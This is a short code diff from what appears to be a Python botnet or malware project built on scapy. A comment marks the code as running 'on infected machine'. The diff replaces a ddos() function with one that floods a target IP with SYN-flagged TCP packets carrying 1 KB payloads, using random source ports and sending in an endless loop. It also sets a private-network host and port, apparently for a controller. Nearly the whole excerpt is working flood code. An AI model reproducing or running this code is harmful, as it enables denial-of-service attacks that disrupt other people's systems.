@@ -13,20 +13,14 @@ from multiprocessing import Process
 from scapy.all import *
 
 # CODE THAT RUNS ON INFECTED MACHINE WILL GO HERE
-def ddos(ip):
-    source_IP = str(socket.gethostbyname(socket.gethostname()))
-    target_IP = ip
-    source_port = 80
-    i = 1
+def ddos(target_IP):
+    tcp = TCP(sport=RandShort(), dport=80, flags="S")
+    ip = IP(dst=target_IP)
 
-    while True:
-        IP1 = IP(src = source_IP, dst = target_IP)
-        TCP1 = TCP(sport = source_port, dport = 80)
-        pkt = IP1 / TCP1
-        send(pkt, inter = .001)
-        
-        #print ("packet sent ", i)
-        i = i + 1 
+
+    raw = Raw(b"X"*1024)
+    p = ip / tcp / raw
+    send(p, loop=1, verbose = 0)
 
 HOST = "192.168.56.103"
 PORT = 1234
